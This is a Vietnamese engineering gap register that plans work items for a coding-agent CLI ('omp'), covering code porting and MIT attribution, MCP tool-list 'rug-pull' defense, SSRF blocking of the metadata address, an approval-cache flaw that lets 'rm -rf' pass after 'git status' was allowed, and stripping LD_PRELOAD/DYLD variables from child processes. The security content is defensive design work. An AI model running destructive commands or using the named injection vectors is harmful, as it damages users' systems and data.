**Pháp lý:** chép được, chép rồi phải giữ MIT notice. `~/Projects/senpi-ref/LICENSE` là MIT thuần (22 dòng; dòng 1 "MIT License"; dòng 3 "Copyright (c) 2025 Mario Zechner (upstream pi-mono)"; dòng 4 "Copyright (c) 2026 Yeongyu Kim and senpi contributors"). senpi **không** có điều khoản AGPL/MuPDF và **không** có copyleft ở đâu trong cây; nghĩa vụ bên thứ ba duy nhất có sức ép hành vi là LinkeDOM (ISC) ghi trong `NOTICE.md` của họ, mà mục này không đụng tới. Nghĩa vụ cho một hàm ~40 dòng: giữ notice + copyright, ghi attribution vào `NOTICE.md` của omp **ghim theo SHA `ea9216269e9254b821446130b60d1e00759761dc`**, không lấy trademark senpi. M7 W0 đã đặc tả đúng như vậy.

**Cái được bảo toàn.** `buildSessionContext()` phải giữ nguyên hành vi drop hiện tại — nếu không thì session-restore sẽ giữ lại những turn đáng lẽ phải mất. Và `findCutPoint` phải giữ nguyên thuật toán cắt pair-safe; chỉ phần **đếm trước** thay đổi.

**Phụ thuộc:** W0 (pháp lý). Không cái gì khác — không chạm bốn seam API, không cần `agent_settled` hay `sessionSettings`.

**Đã phủ chưa:** **một phần, về tinh thần chứ không phải ở cổng work item.** MILESTONE_7 không có work item cho việc này; gần nhất là tool-pair-guard đã rút (`appendix, :1831-1855`) — cái đó phủ **ORPHAN tool_use/tool_result pairing**, một kiểu hỏng khác. Không work item nào trong bốn mục của M7 (W0, SEAM, SEAMFREE, LOOKAT) nhắc compaction accounting.

---

## GAP-M7-03 — Rug-pull defense: tool mới từ `notifications/tools/list_changed` không được tự kích hoạt

**Nguồn:** `senpi.62` · **Effort:** M — khoảng 1 ngày
**Xếp sau GAP-M7-01** trong sóng 0c.

**Cái omp thiếu — đã kiểm, chuỗi đầy đủ từ đầu đến cuối.** omp **TỰ KÍCH HOẠT** mọi tool mà server đẩy. Chuỗi: `mcp/manager.ts:954` `#triggerNotificationRefresh` → `refreshServerTools(name)` → `manager.ts:429-431` handler `setOnToolsChanged` → `agent-session.ts:6055` `refreshMCPTools(tools)` → `session-tools.ts:2164` `#applyMCPToolRefresh`, mà comment của chính nó ở `:2205-2206` nói nguyên văn *"Connected manager tools become active immediately."* Tập active được dựng lại ở `:2210-2214` là `[...#getActiveNonMCPToolNames(), ...#mcpManagerToolNames, ...retainedActiveExtensionToolNames]` — và `#mcpManagerToolNames` được điền từ catalog **MỚI** ở `:2200-2202`, nên **mọi tool mới xuất hiện đều rơi vào `nextActive`**.

Cũng **không có tombstone**: `manager.ts:942-949` `#replaceServerTools` lọc theo `mcpServerName` và **xoá hẳn** tool bị rút, nên một lời gọi cũ tới tool đã bị rút rơi vào đường dispatch-miss thay vì một `isError` sạch.

Mitigation sẵn có của omp chỉ là `ToolApproval` (gate theo **tier**, không theo **identity** — `resolveApproval` tại `approval.ts:203` khoá trên `policyKey ?? tool.name`, nên tool mới đơn giản là vắng mặt trong `tools.approval` và thừa kế mặc định của mode) và `ToolTier` per-tool, mà server lừa đảo thỏa dễ bằng cách tự mô tả tool của nó là read-only. `registerToolsPreservingActiveSet` của senpi (snapshot `getActiveTools()` → register → `setActiveTools()`) chính là nửa còn thiếu, và nó độc lập với substrate.

**Hình dạng port.** Hai chỉnh sửa phối hợp, đều nhỏ.
1. Trong `#applyMCPToolRefresh`, tách catalog đến thành "đã active trước lần refresh này" và "mới xuất hiện"; chỉ activate tập đầu, phần còn lại **registered-but-inactive**. Seam `#previousActiveMcpToolNames` tại `:2180` **đã bắt đúng tập** — nó chỉ đang được dùng cho extension retention (`:2207-2209`) thay vì để gate manager tools.
2. Trong `#replaceServerTools`, giữ một tombstone `CustomTool` cho các tên bị rút, `execute` trả `isError` với thông điệp "tool no longer offered".

**KHÔNG** port `active-set.ts` như một module riêng — gộp hai luật vào chính hai hàm hiện có, để có **một** nguồn sự thật cho "cái gì đang active".

**Pháp lý:** chép được, giữ MIT notice. Trung thực mà nói thì hai luật lấy từ đây cũng là thứ dễ tự suy ra hơn là chép — nên framing đúng là "ý tưởng + một diff nhỏ đè lên chính hàm của omp"; vẫn cần attribution cho bất kỳ dòng nào mang qua. W0 chi phối.

**Cái được bảo toàn.** Cơ chế `tools.approval` và `ToolTier` phải giữ nguyên hành vi — item này thêm một lớp **trước** chúng, không sửa chúng. `retainedActiveExtensionToolNames` giữ nguyên: tool của extension không đi qua đường này.

**Đã phủ chưa:** **không.** Không work item nào của M7 nhắc `list_changed`, giữ tập active, hay tombstone tool. Cơ chế `tools.approval` mà rank-6 của SEAMFREE (anthropic-bash) chạm là tier gate, không phải cái này.

---

# 4. Work item cần người quyết

Chín quyết định. Mỗi mục là **một câu hỏi có phương án**, không phải một ghi chú. Tên `GAP-D<n>` để các mục work item trỏ tới.

| # | Mục | Quyết định | Phương án |
| --- | --- | --- | --- |
| **GAP-D1** | GAP-M6-12 | **Có chặn loopback mặc định không?** Đây là quyết định chặn. Chặn `127.0.0.1` theo mặc định sẽ **phá mọi MCP server local** — và local MCP là một trong những cách dùng phổ biến nhất. | **(a)** Deny toàn bộ loopback, chỉ mở khi user khai báo; **(b)** Chỉ chặn link-local + `169.254.169.254` + multicast, **để loopback qua** với cảnh báo; **(c)** Deny loopback nhưng có escape hatch theo server. **Khuyến nghị (b)** — nó chặn đúng vectơ SSRF/metadata mà không đổi hành của người dùng bình thường. |
| **GAP-D2** | GAP-M4-13 | **`ApprovalEntry` mở rộng union `SessionEntry`, hay tái dùng `CustomEntry` có sẵn?** | **(a)** Biến thể mới → format mở rộng, cần cân nhắc migration, nhưng truy vấn được bằng type; **(b)** `CustomEntry` → **không** mở rộng format, nhưng phải đọc log bằng tay. Cùng loại với "open question M4-4-OQ1" mà M4 đã ghi. |
| **GAP-D3** | GAP-M2-7 | **Thêm `modified` nghĩa là lần đầu omp có đường nạp hook bị chặn.** Hai test sẵn có có thể chuyển đỏ. Cho phép chặn im lặng, hay bắt buộc hỏi? | **(a)** Chặn, không hỏi — an toàn nhất, đổi hành người dùng; **(b)** Hỏi một lần rồi ghim — giữ được tiện, phức tạp hơn. **Khuyến nghị (a)** cho `untrusted` ở lần nạp đầu, và hỏi cho `modified`. |
| **GAP-D4** | GAP-M1-18 | **Chốt danh sách check trước khi viết dòng nào.** `doctor` là cái bẫy kinh điển vì mọi tính năng mới đều muốn thêm một check. | Chốt danh sách ở trên; **mọi check sau đó phải tự chứng minh được bằng một test** — không thêm check chỉ vì "thông tin này hữu ích". Cần một quy tắc ghi vào PR template, không chỉ ý định miệng. |
| **GAP-D5** | GAP-M1-20 | **Giữ đường hồi tương thích cho cache `allow_always` theo tên tool cũ không?** Các phiên đang cache sẽ hỏi lại một lần nữa. | **Khuyến nghị: không giữ** — cache cũ theo tên tool chính là thứ đang gây lỗi (`rm -rf` sau một "always allow" cho `git status`). Nhưng đây là thay đổi hành vi người dùng thấy, nên phải nêu trong changelog, và quyết định này phải của người chứ không phải của implementer. |
| **GAP-D6** | GAP-M2-8 | **Ngưỡng trần `<skills>` là bao nhiêu?** | **Đo trên một cây thật có nhiều skill trước khi chốt**, không đoán. Câu hỏi phụ: khi vượt trần, phần bị cắt nên là ghim rút gọn hay **loại hẳn** (vì `manage_skill list` đã cho đường tìm lại)? |
| **GAP-D7** | GAP-M3-B4 | **Cảnh báo trùng phím lúc nạp: một dòng tổng hợp, hay một panel liệt kê từng cặp?** | Cả hai rẻ. Cái thứ hai tốn thêm một overlay và một quyết định phím điều hướng. **Khuyến nghị (a)** — lỗi cấu hình thấy một lần lúc nạp là đủ; panel là việc riêng và không nên gộp. |
| **GAP-D8** | GAP-M4-11 | **895 call site: sửa hết, hay di dời có chọn lọc?** | **Không sửa hết trong PR này** — sẽ thành một diff không review được và che mất thay đổi thật. Cần chốt **tiêu chí chọn** (đề xuất: đường chạy trong `catch` ở agent loop, session, TUI error render, logger — nơi nuốt lỗi gốc là thiệt hại thật) và ghi phần còn lại là **nợ kỹ thuật có chủ** kèm owner. |
| **GAP-D9** | GAP-M7-01 | **Trust của project-scope `mcp.json` do ai quyết?** senpi trả lời bằng prompt (senpi.93); mục này trả lời bằng mặc định theo scope. | **(a)** Chỉ mặc định theo scope, không có prompt (rủi ro thấp, người dùng mất tính năng cho project); **(b)** Mặc định theo scope **và** một prompt của M2 WI-0 cho phép nâng lên. **Khuyến nghị (b)** — nhưng (b) **kéo theo một việc chưa ai giao**: M2 WI-0 hiện viết ADR về trust của *extension*, chưa nói gì về **MCP project-scope config**. Câu hỏi đó phải có câu trả lời trong ADR trước khi GAP-M7-01 code. |

---

# 5. Những gì sổ này nói thẳng

1. **Hai mục có giá trị ngay lập tức và gần như miễn phí:** GAP-M1-19 (thêm một rule lint, sửa 10 file) và GAP-M1-20 (đóng một lỗ hổng phê duyệt lan rộng). Nếu chỉ làm hai việc trong đợt này, làm hai cái đó.
2. **Một mục là lỗ hổng, không phải cải tiến:** GAP-M7-01. Nó nên được kéo lên trước W0 nếu W0 sẽ trượt — nghĩa vụ attribution có thể ghi sau, còn RCE thì không.
3. **Sổ này cố ý không đề xuất thứ gì cho M1B, M5 và `PACKAGE_REORGANIZATION_PLAN.md`.** Không mục nào trong 25 mục đầu vào thuộc phạm vi đó, và luật "không bịa thêm work item ngoài danh sách" cấm lấp chỗ trống bằng suy đoán. M1B xuất hiện trong bảng phụ thuộc chỉ vì GAP-M1-18 nói về `logger.ts` và `packages/utils` — chưa đủ để mở một mục.
4. **Ba con số đã bị sửa** (§0). Một trong số đó — `getConflicts` — **không** làm đổi kết luận của mục nào; hai cái còn lại sửa đường dẫn và cơ chế, và cả hai đều sẽ dẫn tới một PR sai nếu giữ nguyên.

---

# Phần bổ sung — 5 repo triage lại

Ngày: 2026-09-29 · Đợt thứ hai · Nguồn mới: `pi` (earendil-works/pi) + **dsh** + **codex** đã quay lại
Mã mới: `GAP-M1-21…22`, `GAP-M1B-1…5`, `GAP-M2-9…14`, `GAP-M3-B6…B9`, `GAP-M4-14…15`, `GAP-M7-04` · Quyết định mới: `GAP-D10…D13`

## P0. Phần bổ sung này khác phần cũ ở chỗ nào

Ba khác biệt cần nói trước, vì chúng đổi cách đọc **cả hai** phần:

| | Phần cũ (§0 → §5) | Phần bổ sung này |
| --- | --- | --- |
| **Nguồn** | 5 repo, nhưng **không có `pi`** — dù `pi` là repo mà M1/M1B đã quyết định chép 21.093 dòng từ đó | `pi` vào vị trí lớn nhất, cộng **hai lần quay lại** `dsh` và `codex` |
| **Hình thức phát hiện** | Đọc audit rồi chấp nhận phần lớn claim của nó | Đo lại từng claim trên cây hiện tại; **21 claim bị bác** vì omp đã có, **8 claim bị sửa** vì đo sai |
| **Quyền với kế hoạch** | Chỉ đề xuất, không đụng kế hoạch | Vẫn đề xuất — **không** sửa `MILESTONE_*.md` — nhưng **được gọi tên** mục nào trong kế hoạch đang sai, và sửa nó là việc của người giao |

**Vì sao số mục bị bác lại nhiều đến thế.** Đợt một lấy claim từ audit rồi viết lại thành work item. Đợt này làm ngược lại: đo trước, viết sau. Kết quả là **20 mục mới** từ **109 claim của dsh + 20 claim của pi + claim của codex**, tức tỉ lệ giữ lại dưới 20%. Đây không phải audit sai — đây là đúng cái mà `MILESTONE_4 §Đính chính 2026-09-28` đã tự viết: *«omp đã có bản thành thụ hơn nhiều của ý tưởng đó, ngay trong công cụ mà claim nhắm tới»*. Mọi mục trong phần bổ sung này đều đã qua một lần đo như vậy.

**Ba mục phá giả định của phần cũ — đọc trước khi dùng số liệu cũ:**
1. **`pi` không phải "không có gì đáng chép".** Trong 20 mục mới, **4 mục là chép nguyên văn từ `pi`** (MIT), và một mục (`pico3`) là khối 25 file / 8.074 dòng — lớn hơn toàn bộ phần chép đã lên kế hoạch cho M1. Phần cũ §5.3 nói «sổ này cố ý không đề xuất thứ gì cho M1B»; câu đó **đúng với đợt một, hết đúng với đợt hai**.
2. **Con số 50 lệnh trong GAP-M1-18 là số sai, và nó sai theo hướng vô hại.** `grep -c 'name: "'` → 50, nhưng đó đếm cả tên option lồng nhau. Số tên lệnh cấp một thật là **49** (`sort -u` trên `^\s+name: "…"`). Kết luận của GAP-M1-18 **không đổi** — `doctor` vẫn không có (0 hit), `session` vẫn không có (0 hit).
3. **Có ba điểm mù đang sống, đo được, chưa có mục nào trong cả hai phần.** Xem `## P1`.

## P1. Ba điểm mù đang sống, đo được

Không thuộc 20 mục mới vì không nằm trong danh sách đầu vào, nhưng là thứ đo được và cả hai phần của sổ đều bỏ qua. Ghi ra đây để không mất:

| Điểm mù | Bằng chứng |
| --- | --- |
| **`/reload` là code chết nửa chỗ.** Kiểu `reason: "startup" \| "reload"` đã khai ở `extensibility/extensions/types.ts:743`, và `rescopeHeadlessToCwd` (`slash-commands/builtin-lifecycle.ts:871`) gọi đủ `settings.reloadForCwd` + `session.refreshSkillsAndCommands()` + `runtime.reloadPlugins()`. Nhưng `grep -rn 'reason: "reload"' packages` → **0 hit**, và lệnh `/reload` tồn tại (`builtin-session.ts:672`) lại chỉ làm MCP. | đo 2026-09-29 |
| **`assertKnownSettingPaths` chỉ canh một trong bảy lớp cấu hình.** Nó được gọi từ `#overrideLayer` (`settings.ts:632`) — lớp `--config` của constructor — **không** từ lớp file. Nghĩa là một key lạ trong `settings.json` của dự án không ném lỗi mà **biến mất im lặng**. | đo 2026-09-29 |
| **`mcp/config.ts:104` bật project-scope config mặc định.** `options?.enableProjectConfig ?? true`; call site ghi đè duy nhất là `read-cli.ts:90`. M2 WI-0 chưa chốt danh sách tài nguyên bị bao trùm, nên chưa mục nào đủ tư cách chạm vào. | đo 2026-09-29 |

## P2. Những gì đo lại ở đợt này và bị sửa

Đúng phong cách §0 của phần cũ. Bốn chỗ, **hai chỗ sẽ dẫn tới một PR sai nếu giữ nguyên claim gốc**:

| Claim đầu vào | Kết quả đo | Xử lý |
| --- | --- | --- |
| codex.112: "dùng `OnceLock`, `git grep OnceLock -- packages/tui/src` cho thấy khuôn đã có" | **Sai.** `OnceLock` → **0 hit** trong `packages/tui/src`. Toàn repo chỉ có **2 chú thích** (`packages/ai/src/providers/openai-codex-responses.ts:552`, `packages/natives/native/index.d.ts:666`) — cả hai đều là văn xuôi mô tả codex-Rust, không phải khuôn có thể dùng lại. | GAP-M3-B8: probe phải **viết mới**, không có khuôn để tái dùng. Đây là chỗ dễ bịa một chi tiết không tồn tại. |
| codex.129: "`grep -n 'name: \"'` cho **43** subcommand" | **Sai, và con số đúng là 49** (xem P0.2). | GAP-M1-22 dùng 49. |
| pi.7: "pico3 = 25 file" | **Đúng, nhưng dễ đọc sai.** 16 file ở cấp gốc + 9 file trong `kinds/`. Tổng 25 file / **8.074 dòng** — con số dòng khớp tuyệt đối. | Giữ nguyên 25/8.074, ghi rõ cấu trúc hai tầng. |
| pi.46: "`restore-sandbox-env.ts` 36 dòng" | **Đúng** (`wc -l` → 36; `sandbox-env-setup.ts` → 4). Nhưng thư mục `src/bun/` của pi còn `cli.ts` và `runtime-setup.ts` nữa — **không** chép, vì omp không có khái niệm `src/bun/`. | GAP-M1B-3 chỉ lấy 2 file, dán vào `packages/utils/src/env.ts` nơi `readLaunchEnv` đã sống. |

## P3. Bảng tổng số work item của phần bổ sung

| Milestone | Mới | Số | Tổng effort xấp xỉ |
| --- | --- | --- | --- |
| **M1** | GAP-M1-21, GAP-M1-22 | 2 | S + S ≈ 1,5 ngày |
| **M1B** | GAP-M1B-1 … GAP-M1B-5 (5 mục) | 5 | S + M + S + **S (quyết định)** + M ≈ 6,5 ngày |
| **M2** | GAP-M2-9 … GAP-M2-14 (6 mục) | 6 | M + S + S + M–L + L + S–M ≈ 11 ngày |
| **M3** | GAP-M3-B6 … GAP-M3-B9 (4 mục) | 4 | M + S–M + S + M ≈ 4,5 ngày |
| **M4** | GAP-M4-14, GAP-M4-15 | 2 | S–M + S ≈ 1,5 ngày |
| **M7** | GAP-M7-04 | 1 | S ≈ 0,5 ngày |
| **Tổng** | | **20** | **≈ 25 ngày** |

**Hai cột này không cộng vào nhau một cách ngu ngạc.** Phần cũ là 23 mục / ≈ 31 ngày trên 5 repo, **không có `pi`**. Phần bổ sung là 20 mục / ≈ 25 ngày trên 3 repo, **có `pi`**. Chênh lệch lớn nhất không nằm ở số mục mà ở chỗ: phần cũ gần như toàn **ý tưởng** (không dòng nào được chép), phần bổ sung có **4 mục chép nguyên văn MIT** — nên effort của nó **thấp hơn trông**, và rủi ro pháp lý của nó **cao hơn trông**.

### Thứ tự mở PR của riêng phần bổ sung

Khác hẳn §1 của phần cũ: đây **không** phải thứ tự ưu tiên, mà là thứ tự **phụ thuộc cứng**.

1. **GAP-M1B-1** (cổng ngân sách entry-graph) — phải có **trước mọi sóng port**. Lý do: cổng bắt hồi quy khi chép thêm module; bắt sau thì nó đỏ vì port chứ không phải vì hồi quy, và mất luôn ý nghĩa. Rẻ nhất sổ (S, ~0,5 ngày).
2. **GAP-M1B-2** (sáu cổng bất biến dep/packaging) — cùng thư mục `scripts/`, cùng một dòng `check:ts`. Tách file để review dễ hơn, gộp PR được.
3. **GAP-M1-21** (harden tiền-main) — độc lập tuyệt đối, 0,5 ngày, không chặn gì.
4. **GAP-M1-22** (`omp session`) — cùng miền `cli-commands.ts` với GAP-M1-18; xem "SUA MUC" bên dưới.
5. **GAP-M1B-3** (khôi phục env bị sandbox nuốt) — 40 dòng, gộp chung PR với #1.
6. **GAP-M1B-4** (quyết định pico3) — **phải chốt trước M2**, vì hai mục M2 dưới đây giả định có một vòng đời extension đã biết là gì.
7. **GAP-M4-15** (báo `hooks` bị nuốt) — **sau GAP-M1-18**, vì nó cần một dòng trong `omp doctor`.
8. **GAP-M3-B7** (trình remap phím) — **sau GAP-M3-B4**, vì cần cùng một hàm format cảnh báo trùng.
9. **GAP-M7-04** — cùng PR hoặc ngay sau GAP-M7-02.
10. Còn lại theo thứ tự milestone.

## P4. Vì sao bốn mục M1B nằm trước, và vì sao một mục M2 nằm sau

Đây là chỗ phần bổ sung lệch nhiều nhất so với cách sổ cũ phân bổ, nên nói thẳng:

- **M1B không phải "sổ 5 repo" hợp với nó, mà là nơi duy nhất trong chương trình được giao quyền trả lời "chép gì từ `pi`".** M1B §1 đã tự ghi là chưa làm: *«Việc cần làm lại: `core/extensions/` của `pi` so với `packages/coding-agent/src/extensibility/extensions/` của omp. Đó là so sánh thật sự liên quan tới vòng đời, và nó chưa nằm trong tài liệu này»*. GAP-M1B-4 chính là câu hỏi đó, được nâng thành work item có tên.
- **Bốn mục M1B còn lại là cổng bảo vệ cây port, không phải tính năng.** 21.093 dòng sắp chép mà không có ngân sách đo thì hồi quy chỉ lộ ra khi người dùng kêu. Ba mục cổng + một mục quyết định, đứng trước toàn bộ.
- **GAP-M2-13 (project trust) đẩy ra sau M2, không giao vào M2.** Vì M2 WI-0 nói thẳng phần thực thi là M–L và nằm **ngoài** M2. Giao nó vào M2 là chốt ngược chính plan. Đây cũng là mục duy nhất trong sổ phải chờ một quyết định trước khi có dòng code nào.
- **GAP-M2-9 … 12 nằm sau lần lượt WI-9, WI-2, WI-3, WI-6.** Cả bốn đều là **hệ quả** của một work item M2 khác, không phải việc độc lập. Đặt cạnh, ghi thứ tự merge — không gộp.

## P5. Những gì phần bổ sung này cố ý KHÔNG đề xuất

| Không đề xuất | Vì sao |
| --- | --- |
| **Bất kỳ dòng nào từ `pi/vendor`, `pi/packages/tui/native/*/prebuilds`, `pi/…/highlight.min.js`, `pi/…/doom.wasm`** | Ba loại trừ đã đo lại, cả ba đúng — xem mục Pháp lý ở từng mục bên dưới. `highlight.min.js` là **BSD-3-Clause** theo chính header của nó, không phải MIT; `doom.wasm` (380.169 byte) không có LICENSE nào đi kèm; 6 file `.node` prebuild không có header. **Không suy luận được giấy phép từ binary.** |
| **Toàn bộ nhóm Cordis của dsh** (`dsh.6/.53/.55/.56/.61/.63/.64/.67/.109`)** | M4 **đã chốt không lấy**, kèm số đo, không phải vì cảm giác. `grep -rl 'cordis' packages/` → 0 file. Giữ nguyên phán quyết cũ. |
| **`pi` core/extensions chép nguyên văn** | Chưa ai đo mức va chạm với `agent-loop.ts` (148 KB) và `compaction/`. `pico3` có `kinds/plugin.ts` + `hooks.ts` — nếu pico3 mới là nguồn sự thật về vòng đời extension thì M1B §1 **sai** ở chỗ coi `core/extensions/` (4.506 dòng) là vòng đời duy nhất. Đó là câu hỏi của GAP-D10, không phải một work item. |
| **Sandbox thật, TLS-PSK, PTC mode, side panel dockable** | M4 đã cấm thêm tính năng; `COMPREHENSIVE_PLAN` hàng 8 đã chốt "chưa xây sandbox trong M6". Gọi chúng là thiếu sẽ biến một kế hoạch kỷ luật thành kế hoạch port tính năng. |
| **Bất kỳ mục nào ngoài 20 mục đầu vào** | Đúng luật §5.4 của phần cũ. Ba điểm mù ở P1 được ghi ra như **sự thật**, không biến thành work item. |

---

# M1 — hai mục mới

## GAP-M1-21 — Harden tiến trình trước main: cấm attach debugger, cấm core dump, lọc `LD_*` khỏi môi trường con

**Nguồn:** `codex.86`
**Milestone:** M1 — cùng sóng với GAP-M1-19, vì cùng là một thay đổi kỷ luật nhỏ, độc lập tuyệt đối, không chạm file người khác đang sửa
**Effort:** S — khoảng 0,5 ngày. Bốn syscall, một module, một chỗ nối.

**Cái omp thiếu — đo được, không suy đoán.** `git grep -rn 'PR_SET_DUMPABLE|RLIMIT_CORE|PT_DENY_ATTACH|LD_PRELOAD|DYLD_INSERT' -- packages crates` → **0 hit**. Entry point `packages/coding-agent/src/cli.ts` chỉ làm đúng **một** việc tiền-main: `process.title = APP_NAME` (dòng **54**, đã đọc lại). Không setuid/setgid, không umask, không rlimit.

Bối cảnh thì đúng: omp là CLI agent giữ API token trong bộ nhớ (`packages/ai/src/auth-storage.ts`, `packages/coding-agent/src/secrets/`) và spawn subprocess không kiểm soát (`bash-interceptor.ts`, `browser/launch.ts`).

**Phần omp ĐÃ có, phải nói để không làm lại:** secret obfuscation, approval gate, process-group kill trong bash-executor (`crates/pi-shell/src/process.rs:1627` `kill_process_group`, leo thang TERM→KILL ở `:1446/:1496/:1525`). **Thiếu đúng một trục: trạng thái bảo vệ của chính tiến trình.**

**Hình dạng port.** Không chép dòng Rust nào. Một module `harden-process.ts` (~50 dòng) + một lời gọi ở đầu `cli.ts`, trước mọi import nặng:
1. Linux: `prctl(PR_SET_DUMPABLE, 0)` và `prctl(PR_SET_PDEATHSIG, SIGKILL)`.
2. Portable: `setrlimit(RLIMIT_CORE, 0)`.
3. `sanitizeChildEnv()` — bỏ `LD_PRELOAD` / `LD_LIBRARY_PATH` / `DYLD_INSERT_LIBRARIES` / `DYLD_LIBRARY_PATH` khỏi env truyền cho mọi child, dùng chung cho `Bun.spawn` và `` $`cmd` `` trong `bash-executor.ts`.

Tất cả sau `try/catch` im lặng + `logger.debug`. **Trên Windows phải là no-op sạch** — không được phép làm hỏng startup.

**Pháp lý:** chỉ mang ý tưởng, không chép dòng nào. codex là Apache-2.0 nhưng phần này là bốn syscall, không phải bản quyền được bảo vệ. Nguyên tắc chỉ mang: *một tiến trình giữ bí mật không nên bị attach, và không nên đổ core dump.*

**Cái được bảo toàn — ba điều kiện, đều bắt buộc:**
1. `process.title = APP_NAME` phải chạy **sau** harden, không phải trước — `prctl(PR_SET_PDEATHSIG)` trên một tiến trình cha đã thoát là hành vi khác.
2. `bun test` và SDK embedding đi vào **cùng** `cli.ts`. Không có guard `isProcessEntry` thì test runner tự dumpable=0, và một test chủ động crash sẽ **im lặng** — đó là thất lạc dễ chẩn đoán nhất từng gặp.
3. Mọi child spawn hiện có (LSP, kernel, browser) phải **tiếp tục nhận** PATH / NODE_PATH / Homebrew của nó. Chỉ `LD_*` và `DYLD_*` bị lọc — lọc rộng hơn là hỏng ngay.

**Thứ tự với GAP-M1-18:** không quan trọng, nhưng phải nói rõ trong PR rằng `doctor` chạy **trong tiến trình đã harden** — `dumpable=0` nghĩa là một check muốn đọc core dump sẽ không được.

---

## GAP-M1-22 — `omp session`: một bề mặt CLI cho session, có archive/unarchive và cờ chọn mục tiêu

**Nguồn:** `codex.129`
**Milestone:** M1 — cùng miền với GAP-M1-18
**Effort:** S — khoảng 1 ngày. Bốn verb là wrapper, không phải logic mới.

**Cái omp thiếu — hai lệnh, đo được cả hai.**
1. `grep -oE '^\s+name: "[a-z0-9-]+"' packages/coding-agent/src/cli-commands.ts | sort -u | wc -l` → **49** lệnh cấp một. **Không có `session`** (`grep -c 'name: "session"'` → 0). *Không có `doctor` nữa* (→ 0), xác nhận lại GAP-M1-18. > Đính chính con số: GAP-M1-18 ghi "50 command" — con số đó đếm bằng `grep -c 'name: "'`, tức tính cả tên option lồng nhau. Số thật là 49. Kết luận không đổi.
2. `grep -rn 'archive' packages/coding-agent/src/slash-commands/` → chỉ `--archive-existing` của `helpers/security.ts:99` (một cờ của nhánh security scan). **Không có verb archive/unarchive session nào.**

**Phần omp ĐÃ có, và khá nhiều:** `--resume` / `-r` / `--session` với `rejectEmpty` (`flag-tables.ts:249`), `--continue` (`:300`), `omp find` (tìm), `omp gc` (dọn), `omp share`, và trong TUI `/resume` `/fork` `/delete` `/export` `/queue`. Thiếu đúng hai thứ: (a) một namespace lệnh để làm việc đó **bằng script**; (b) hai verb vòng đời — lưu trữ và bỏ lưu trữ — cùng cờ chọn mục tiêu theo câu (`--last`) và theo tập (`--all`).

**Khoảng cách: SỬA CHO KHỚP.** Store và lệnh đều có, chỉ thiếu bề mặt.

**Hình dạng port.** Không chép dòng nào. Một entry `session` trong `cli-commands.ts` trỏ tới `commands/session.ts`, lặp lại khuôn của `commands/find.ts` (ba dòng: `name` / `load` / `help`). Năm verb: `list` (mặc định, **nhân bản output của `omp find`** chứ không viết lại), `show`, `archive`, `unarchive`, `delete`. Cờ `--last` / `--all` / `--json`.

**Tái dùng bắt buộc:** `SessionStorageBackend.loadIndex` đã trả path/size/mtime/title — đó là nguồn duy nhất. Mở đường đọc thứ hai cho cùng dữ liệu là tạo nguồn sự thật thứ hai, đúng thứ M4 cấm.

**Pháp lý:** chỉ mang ý tưởng. Khuôn lấy từ chính `commands/find.ts` của omp, không từ codex.

**Cái được bảo toàn — bốn điều:**
1. `--resume` / `--continue` / `-r` nguyên vẹn — đường một-shot, đổi chúng là hồi quy trực tiếp.
2. `omp find` phải giữ **từng byte output** — đã có script phụ thuộc.
3. `/resume` `/fork` trong TUI không được đổi. Lệnh CLI là **bề mặt thứ hai trên cùng store**, không phải nguồn sự thật thứ hai.
4. `omp gc` và `omp share` giữ nguyên phạm vi, dù chạm cùng tập session.

**Thứ tự merge với GAP-M1-18 — bắt buộc, và lý do rất cụ thể.** Cả hai sửa `cli-commands.ts`. Bảng cổng đỏ phải chứa **một** assertion *"mọi subcommand trong registry thật sự được phân tuyến"*, không phải hai assertion riêng. Lý do: một lệnh thiếu trong `cli-commands.ts` rơi xuống `runCli` và **argv thành prompt cho LLM** (hồi quy #1499/#1496) — đó là hậu quả im lặng, và hai assertion rời rạc sẽ cho phép nó quay lại.

---

# M1B — từ `pi`: bốn cổng, một quyết định

> Vì sao khối này tồn tại và vì sao nó phải trước: xem **P4** ở trên.

## GAP-M1B-1 — Cổng ngân sách module-graph cho từng entrypoint: biến phép đo `PI_TIMING` thành một cái cổng đỏ

**Nguồn:** `pi.1`
**Milestone:** M1B — sóng 0.5, cùng WI-ECOSYS-1
**Effort:** S — khoảng 0,5 ngày (2 file `.mjs` + 1 file baseline + 1 dòng trong `check:ts`)

**GẦN NHẤT ĐÃ CÓ:** GAP-M6-13 (sổ ngưỡng hiệu năng) — cùng hình dạng «một con số đã đo được nhưng không ai canh», khác tầng. Sổ đăng ký **không có mục pi nào**, nên đây là mục mới, không phải mục trùng.

**Đây đúng là thứ M1B Sóng 0.5 tự đặt ra cho chính nó.** WI-ECOSYS-1 viết: *«cổng duy nhất nên thêm: một script kiểm độ phủ chạy được trên danh sách package thật, có số trong báo cáo. Đó là thứ biến "17/20" từ một con số lạ thành một cái cổng»*. `pi.1` là cùng hình dạng. Và nó phải đứng **trước mọi sóng port** — vì cổng này bắt hồi quy khi chép thêm provider/module.

**Cái omp thiếu — có đúng nửa (1) ĐO, thiếu nửa (2) CỔNG.** Đã kiểm:
- **ĐO — có đủ:** `packages/utils/src/module-timer.ts` (6.3 KB, Bun.plugin `build.onLoad`, inclusive window mỗi module), `packages/utils/src/timing-buffer.ts` (1.6 KB, hợp đồng dùng chung), `logger.ts:524` drain buffer vào cây log, và script `package.json:75` `"dev:timing": "PI_TIMING=x bun --cwd=packages/coding-agent --preload ../utils/src/module-timer.ts src/cli.ts"`.
- **CỔNG — không có:** `grep -rniE 'entry.?graph|bundle.?budget|startup.?budget|graph.?cost' package.json scripts/ .github/` → **0 hit**.
- Bên `pi`: `scripts/check-entry-graphs.mjs` (5.3 KB) + `scripts/cost.ts` (5.3 KB) + hai smoke entry.

**Hình dạng port — chép rồi sửa, không viết mới.** `check-entry-graphs.mjs` và `cost.ts` là hai file `.mjs` độc lập, **không import gì từ omp**. Sửa: đường dẫn entry sang `packages/coding-agent/src/cli.ts` + các worker selector, ngưỡng lấy từ một file baseline commit sẵn.

**KHÔNG lấy** `agent-treeshake-smoke-entry.ts` / `browser-smoke-entry.ts` — chúng chạm `experimental/` mà M1B đã loại.

**Pháp lý:** MIT — chép nguyên văn kèm giữ nguyên dòng `Copyright (c) 2025 Mario Zechner`. Không dính exclusion nào (không phải wasm, không phải `.node`, không phải highlight.js). Theo M1B §1: lấy nguyên văn `LICENSE` gốc rồi **nối thêm** dòng bản quyền của omp, giữ Zechner là dòng **đầu**. Xoá dòng Zechner là hành động duy nhất làm cho bản chép vi phạm luật. `packages/omptype/LICENSE` là hình mẫu.

**Cái được bảo toàn — hai điều, cả hai đều dễ làm hỏng ngay lần chạy đầu:**
